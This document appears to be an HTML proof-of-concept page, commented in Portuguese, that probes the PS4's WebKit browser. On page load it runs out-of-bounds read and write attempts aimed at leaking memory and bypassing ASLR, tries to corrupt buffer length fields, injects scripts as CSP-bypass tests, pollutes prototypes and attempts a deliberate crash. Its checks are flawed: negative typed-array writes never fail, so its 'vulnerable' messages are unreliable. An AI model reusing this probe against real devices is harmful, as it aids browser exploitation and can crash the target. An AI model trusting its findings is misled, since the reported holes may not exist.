<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit PoC - Foco Info Leak</title>
    <style>
        /* Estilos CSS */
        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 12px; }
        #poc-output { background: #222; border: 1px solid #444; padding: 10px; height: 80vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
        .log-info { color: #6cf; }
        .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
        .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; }
        .log-vuln { color: #ff4444; font-weight: bold; } /* Vermelho vivo */
        .log-leak { color: #FF9800; font-weight: bold; } /* Laranja para leaks potenciais */
        .log-good { color: #4CAF50; }
        .log-warn { color: #FFC107; }
        .log-error { color: #f44336; }
    </style>
</head>
<body>
    <h1>PS4 WebKit PoC - Tentativas de Info Leak (ASLR Bypass)</h1>
    <p>Foco em ler OOB perto do início do buffer e tentar corromper metadados.</p>
    <div id="poc-output"></div>

    <script>
        let outputDiv = document.getElementById('poc-output');
        const log = (message, type = 'info') => { /* Função log igual anterior */
             if (!outputDiv) return; try { const t = `[${new Date().toLocaleTimeString()}] `; const s = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;"); if (outputDiv.innerHTML.length > 500000) { outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 250000); outputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDiv.innerHTML; } outputDiv.innerHTML += `<span class="log-${type}">${t}${s}\n</span>`; outputDiv.scrollTop = outputDiv.scrollHeight; } catch (e) { console.error("Erro log:", e); outputDiv = null; }
        };
        const PAUSE_DURATION = 300;

        // --- Funções de Teste Focadas em Leak ---

        // Teste 1: OOB Write Confirmação + Leitura OOB Próxima ao Início
        const runOOBReadNearStart = async () => {
            log("--- Iniciando Teste 1: OOB Write + Leitura OOB Perto do Início ---", 'test');
            try {
                const bufferSize = 128; // Buffer maior pode ajudar a ter mais coisas perto
                const buffer = new ArrayBuffer(bufferSize);
                const u8view = new Uint8Array(buffer);
                const dataView = new DataView(buffer); // Para leituras não alinhadas/específicas

                // Confirmar OOB Write primeiro
                const confirmWriteOffset = -1;
                log(`Confirmando OOB Write em ${confirmWriteOffset}...`, 'subtest');
                try {
                    u8view[confirmWriteOffset] = 0xDD;
                    log("OOB Write confirmado.", 'good');
                } catch (e) {
                    log("FALHA ao confirmar OOB Write inicial. Teste de leak abortado.", 'error');
                    return; // Não continuar se OOB write não funciona
                }

                log("Tentando leituras OOB perto do início do buffer (-16 a +16 bytes)...", 'subtest');
                // Offsets em bytes relativos ao início do buffer (0)
                const relativeOffsets = [-16, -12, -8, -4, 0, 4, 8, 12, 16];
                let foundPotentialLeak = false;

                for (const offset of relativeOffsets) {
                    if (offset === 0) continue; // Ler offset 0 não é OOB

                    // Ler como Uint32 (potenciais ponteiros/tamanhos)
                    try {
                        // DataView lê a partir do offset em bytes. Usar littleEndian=true (comum em x86/ARM64)
                        const val32 = dataView.getUint32(bufferSize + offset, true); // Ler OOB usando o offset a partir do FIM do buffer pode ser mais fácil que antes do início
                        //const val32 = dataView.getUint32(Math.max(0, offset), true); // Ler a partir do início, cuidando de offset negativo
                        log(`Leitura OOB U32 @ offset ${offset} relativo ao início: 0x${val32.toString(16)}`, val32 !== 0 ? 'leak' : 'info');
                        if (val32 > 0xFFFF && val32 !== 0xFFFFFFFF) { // Heurística muito simples para ponteiro
                             log(`  >> VALOR SUSPEITO (U32)! Potencial ponteiro ou dado importante.`, 'vuln');
                             foundPotentialLeak = true;
                        }
                    } catch (e) { log(`Erro Leitura OOB U32 @ ${offset}: ${e.message}`, 'warn'); }

                    // Ler como Float64 (potenciais ponteiros 64bit ou outros dados)
                    try {
                        // Garantir que offset é válido para Float64 (8 bytes)
                        if ((bufferSize + offset) >= 0 && (bufferSize + offset + 8) <= u8view.length + 50) { // Margem OOB grande
                           const val64 = dataView.getFloat64(bufferSize + offset, true);
                           log(`Leitura OOB F64 @ offset ${offset} relativo ao início: ${val64}`, !isNaN(val64) && val64 !== 0 ? 'leak' : 'info');
                           if (!isNaN(val64) && val64 !== 0) {
                               log(`  >> VALOR SUSPEITO (F64)! Potencial dado/ponteiro.`, 'vuln');
                               foundPotentialLeak = true;
                           }
                        }
                    } catch (e) { log(`Erro Leitura OOB F64 @ ${offset}: ${e.message}`, 'warn'); }

                    await new Promise(resolve => setTimeout(resolve, 20)); // Pausa mínima
                }

                if (!foundPotentialLeak) {
                    log("Nenhum valor OOB suspeito encontrado perto do início do buffer.", 'info');
                }

            } catch (e) { log(`Erro GERAL no teste OOB Read Near Start: ${e.message}`, 'warn'); }
            log("--- Teste 1 Concluído ---", 'test');
        };

        // Teste 2: OOB Write Tentando Corromper Metadados (Length)
        const runOOBCorruptLength = async () => {
             log("--- Iniciando Teste 2: OOB Write Tentando Corromper Length ---", 'test');
             try {
                 const bufferSize = 32;
                 const buffer = new ArrayBuffer(bufferSize);
                 const view = new Uint8Array(buffer);
                 const originalViewLength = view.length;
                 const originalBufferLength = buffer.byteLength;

                 // Offsets onde o 'length' pode estar armazenado (antes do buffer)
                 const metaOffsets = [-4, -8, -12, -16];
                 // Valores para tentar escrever (tamanho grande, tamanho pequeno, etc)
                 const lengthValues = [0xFFFFFFFF, 0x1000, 1, 0];
                 let corruptionFound = false;

                 for (const offset of metaOffsets) {
                     if (corruptionFound) break;
                     for (const value of lengthValues) {
                         log(`Tentando escrita OOB (valor=${value}) no offset ${offset} visando 'length'...`, 'subtest');
                         try {
                             // Usar DataView para escrever o valor como Uint32
                             const dataViewForWrite = new DataView(new ArrayBuffer(4));
                             dataViewForWrite.setUint32(0, value, true); // littleEndian
                             const bytesToWrite = new Uint8Array(dataViewForWrite.buffer);

                             // Escrever OOB byte a byte
                             for (let i=0; i<bytesToWrite.length; i++) {
                                 // Offset de escrita OOB (relativo ao INÍCIO do buffer)
                                 // Precisamos de uma forma de escrever em offset negativo! Acesso direto pode falhar.
                                 // Reutilizar a escrita OOB em offset positivo que funcionou antes?
                                 // Isso torna difícil mirar offsets negativos.
                                 // Vamos tentar a escrita direta, PODE FALHAR.
                                 view[offset + i] = bytesToWrite[i]; // TENTA ESCREVER EM OFFSET NEGATIVO
                             }
                             log("Escrita OOB para corromper length realizada (sem erro imediato). Verificando...", 'warn');

                             // Verificar se o length mudou
                             if (view.length !== originalViewLength) {
                                 log(`VULNERÁVEL: view.length alterado! Original=${originalViewLength}, Atual=${view.length}`, 'vuln');
                                 corruptionFound = true; break;
                             }
                             if (buffer.byteLength !== originalBufferLength) {
                                 log(`VULNERÁVEL: buffer.byteLength alterado! Original=${originalBufferLength}, Atual=${buffer.byteLength}`, 'vuln');
                                 corruptionFound = true; break;
                             }
                             log(`Lengths permaneceram: view=${view.length}, buffer=${buffer.byteLength}`, 'info');

                             // Se não mudou, tentar acessar OOB usando o índice
                             try {
                                 let readOOB = view[originalViewLength + 10];
                                 log(`Acesso a view[OOB] não causou erro (valor: ${readOOB}). Length não parece corrompido.`, 'info');
                             } catch (e) {
                                 log(`Acesso a view[OOB] causou erro esperado: ${e.message}`, 'good');
                             }

                         } catch (writeError) {
                             log(`Escrita OOB em offset ${offset} bloqueada/erro: ${writeError.message}`, 'good');
                             // Se a escrita em offset negativo direto falhar, esta abordagem não funciona.
                         }
                         await new Promise(resolve => setTimeout(resolve, 50));
                     } // end loop values
                 } // end loop offsets

                 if (!corruptionFound) {
                     log("Nenhuma corrupção de 'length' detectada com esta abordagem.", 'info');
                 }

             } catch (e) { log(`Erro GERAL no teste OOB Corrupt Length: ${e.message}`, 'warn'); }
             log("--- Teste 2 Concluído ---", 'test');
        };

        // Teste 3: CSP Bypass (Mantido para permitir execução)
        const runCSPTest = () => {
             log("--- Iniciando Teste 3: CSP Bypass (Confirmação) ---", 'test');
             log("Injetando script data: URI...", 'info'); try{const s=document.createElement('script');s.src='data:text/javascript;base64,bG9nKCJWVUxORVLCgVZFTDogQnlwYXNzIENTUCBkYXRhOiBVUkkgT0shIiwidnVsbicpOw==';document.body.appendChild(s);}catch(e){}
             log("Injetando img onerror...", 'info'); try{const i=document.createElement('img');i.src='x';i.onerror=()=>{log("VULNERÁVEL: Bypass CSP onerror OK!",'vuln');};document.body.appendChild(i);}catch(e){}
             log("Injetando link javascript:...", 'info'); try{const a=document.createElement('a');a.href="javascript:log('VULNERÁVEL: Bypass CSP link clicado!','vuln');alert('CSP Link Bypass!');";a.textContent="[Clique AQUI Teste JS URI]";a.style.cssText='display:block;margin:5px;color:orange;';outputDiv.appendChild(a);log("Link add (clique manual).",'warn');}catch(e){}
             log("--- Teste 3 Concluído ---", 'test');
        };

        // Teste 4: Prototype Pollution (Mantido para confirmação)
        const runPPBasic = () => {
             log("--- Iniciando Teste 4: PP Básico (Confirmação) ---", 'test'); const k='__pp_test__',v='PP OK';try{log(`Poluindo['${k}']...`,'info');Object.prototype[k]=v;const t={'w':window,'n':{}};let c=0;for(const n in t){try{if(t[n]&&t[n][k]===v){log(`VULNERÁVEL: PP básica! ${n}.${k}=${t[n][k]}`,'vuln');c++;}}catch(e){}} if(c>0)log(`Confirmado:${c} obj(s) poluído(s).`,'vuln');else log(`Aviso:Ñ confirmou PP.`,'warn'); try{delete Object.prototype[k];log("Limpou PP.",'info');}catch(e){}}catch(e){} log("--- Teste 4 Concluído ---",'test');
        };

        // Teste 5: Crash Probe (Opcional, pode ser removido se instável)
        const runOOBCrashProbe = async () => {
            log("--- Iniciando Teste 5: OOB Crash Probe ---", 'test');
            log("AVISO: PODE TRAVAR!", 'warn'); await new Promise(resolve => setTimeout(resolve, 2000));
            try { const b=new ArrayBuffer(32),v=new Uint8Array(b); const o=-30000; log(`Tentando escrita OOB AGRESSIVA offset ${o}...`, 'info'); v[o]=0xFF; log(`AVISO: Escrita OOB agressiva NÃO travou.`, 'warn'); }
            catch (e) { log(`Erro crash probe (NÃO travou): ${e.message}`, 'warn'); }
            log("--- Teste 5 Concluído (se não travou) ---", 'test');
        };


        // --- Função Principal de Execução ---
        const runAllTests = async () => {
            log("Iniciando testes de PoC (FOCO INFO LEAK v3)...");
            const tests = [
                runOOBReadNearStart,     // Teste 1 - Leak perto do início
                runOOBCorruptLength,     // Teste 2 - Corromper Length
                runCSPTest,              // Teste 3 - CSP (Necessário)
                runPPBasic,              // Teste 4 - PP (Confirmar)
                runOOBCrashProbe         // Teste 5 - Crash Probe (Opcional)
            ];

            for(let i=0; i < tests.length; i++){
                 if (!outputDiv) { console.error("Output div NULO, parando testes."); break; }
                 try {
                     log(`--- EXECUTANDO TESTE ${i+1}/${tests.length} ---`, 'test');
                     const testFn = tests[i]; const result = testFn();
                     if (result instanceof Promise) { await result; }
                 } catch(testError) { log(`ERRO INESPERADO TESTE ${i+1}: ${testError.message} ${testError.stack}`, 'error'); }
                 if (i < tests.length - 1 && outputDiv) {
                    log(`Pausa ${PAUSE_DURATION}ms...`, 'info'); await new Promise(resolve => setTimeout(resolve, PAUSE_DURATION));
                 }
            }
            if(outputDiv) log("\n\nTodos os testes PoC INFO LEAK v3 concluídos (se não travou).", 'test');
            else console.error("Script concluído, mas div log não disponível.");
        };

        document.addEventListener('DOMContentLoaded', runAllTests);

    </script>

</body>
</html>
